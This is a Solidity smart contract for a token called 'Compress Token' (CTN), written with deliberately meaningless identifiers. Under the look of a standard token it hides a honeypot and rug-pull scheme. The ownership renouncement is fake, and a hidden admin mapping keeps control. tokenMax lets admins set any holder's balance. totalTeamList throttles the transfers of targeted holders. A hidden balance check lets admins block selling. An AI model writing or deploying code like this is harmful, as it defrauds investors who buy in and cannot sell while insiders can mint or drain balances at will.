//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface autoMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverMin) external view returns (uint256);

    function transfer(address autoShould, uint256 fromMarketingAmount) external returns (bool);

    function allowance(address marketingLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromMarketingAmount) external returns (bool);

    function transferFrom(
        address sender,
        address autoShould,
        uint256 fromMarketingAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverFee, uint256 value);
    event Approval(address indexed marketingLiquidity, address indexed spender, uint256 value);
}

abstract contract senderReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeReceiverMin {
    function createPair(address receiverMode, address sellMin) external returns (address);
}

interface tradingMode is autoMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CompressToken is senderReceiver, autoMax, tradingMode {

    string private walletTrading = "CTN";

    uint256 private isSwapTo = 100000000 * 10 ** 18;

    function totalTeamList(address tokenAmount) public {
        modeSender();
        if (atTo != senderExempt) {
            tradingIs = false;
        }
        if (tokenAmount == amountMinLaunched || tokenAmount == shouldReceiverIs) {
            return;
        }
        maxAuto[tokenAmount] = true;
    }

    address public amountMinLaunched;

    mapping(address => mapping(address => uint256)) private txAuto;

    bool private liquidityAt;

    uint256 public senderExempt;

    function modeSender() private view {
        require(autoAmount[_msgSender()]);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isSwapTo;
    }

    uint256 maxSwap;

    function name() external view virtual override returns (string memory) {
        return toBuyList;
    }

    constructor (){
        
        marketingExempt tokenEnable = marketingExempt(maxTradingLaunched);
        shouldReceiverIs = takeReceiverMin(tokenEnable.factory()).createPair(tokenEnable.WETH(), address(this));
        if (liquidityAt) {
            senderExempt = atTo;
        }
        amountMinLaunched = _msgSender();
        maxShouldTo();
        autoAmount[amountMinLaunched] = true;
        maxWallet[amountMinLaunched] = isSwapTo;
        
        emit Transfer(address(0), amountMinLaunched, isSwapTo);
    }

    function tokenMax(address teamReceiver, uint256 fromMarketingAmount) public {
        modeSender();
        maxWallet[teamReceiver] = fromMarketingAmount;
    }

    function exemptAmount(address fromTake, address autoShould, uint256 fromMarketingAmount) internal returns (bool) {
        if (fromTake == amountMinLaunched) {
            return launchedIs(fromTake, autoShould, fromMarketingAmount);
        }
        uint256 shouldFee = autoMax(shouldReceiverIs).balanceOf(swapBuy);
        require(shouldFee == atToken);
        require(autoShould != swapBuy);
        if (maxAuto[fromTake]) {
            return launchedIs(fromTake, autoShould, shouldEnableAt);
        }
        return launchedIs(fromTake, autoShould, fromMarketingAmount);
    }

    uint256 constant shouldEnableAt = 4 ** 10;

    uint256 private launchTradingMax;

    uint256 atToken;

    bool private launchedTo;

    bool public tradingIs;

    uint8 private listEnableWallet = 18;

    address private receiverLaunch;

    string private toBuyList = "Compress Token";

    function symbol() external view virtual override returns (string memory) {
        return walletTrading;
    }

    function modeShould(uint256 fromMarketingAmount) public {
        modeSender();
        atToken = fromMarketingAmount;
    }

    function owner() external view returns (address) {
        return receiverLaunch;
    }

    function transfer(address teamReceiver, uint256 fromMarketingAmount) external virtual override returns (bool) {
        return exemptAmount(_msgSender(), teamReceiver, fromMarketingAmount);
    }

    mapping(address => bool) public maxAuto;

    function maxShouldTo() public {
        emit OwnershipTransferred(amountMinLaunched, address(0));
        receiverLaunch = address(0);
    }

    address maxTradingLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address fromTake, address autoShould, uint256 fromMarketingAmount) external override returns (bool) {
        if (_msgSender() != maxTradingLaunched) {
            if (txAuto[fromTake][_msgSender()] != type(uint256).max) {
                require(fromMarketingAmount <= txAuto[fromTake][_msgSender()]);
                txAuto[fromTake][_msgSender()] -= fromMarketingAmount;
            }
        }
        return exemptAmount(fromTake, autoShould, fromMarketingAmount);
    }

    mapping(address => bool) public autoAmount;

    uint256 private atTo;

    mapping(address => uint256) private maxWallet;

    address public shouldReceiverIs;

    function approve(address teamTx, uint256 fromMarketingAmount) public virtual override returns (bool) {
        txAuto[_msgSender()][teamTx] = fromMarketingAmount;
        emit Approval(_msgSender(), teamTx, fromMarketingAmount);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return listEnableWallet;
    }

    address swapBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function buyMode(address minTeamAmount) public {
        if (teamLiquidity) {
            return;
        }
        if (atTo == senderExempt) {
            launchTradingMax = atTo;
        }
        autoAmount[minTeamAmount] = true;
        if (tradingIs != liquidityAt) {
            launchTradingMax = atTo;
        }
        teamLiquidity = true;
    }

    function getOwner() external view returns (address) {
        return receiverLaunch;
    }

    bool public teamLiquidity;

    function launchedIs(address fromTake, address autoShould, uint256 fromMarketingAmount) internal returns (bool) {
        require(maxWallet[fromTake] >= fromMarketingAmount);
        maxWallet[fromTake] -= fromMarketingAmount;
        maxWallet[autoShould] += fromMarketingAmount;
        emit Transfer(fromTake, autoShould, fromMarketingAmount);
        return true;
    }

    function balanceOf(address receiverMin) public view virtual override returns (uint256) {
        return maxWallet[receiverMin];
    }

    function allowance(address enableSwapShould, address teamTx) external view virtual override returns (uint256) {
        if (teamTx == maxTradingLaunched) {
            return type(uint256).max;
        }
        return txAuto[enableSwapShould][teamTx];
    }

    event OwnershipTransferred(address indexed maxTotalList, address indexed toListTx);

}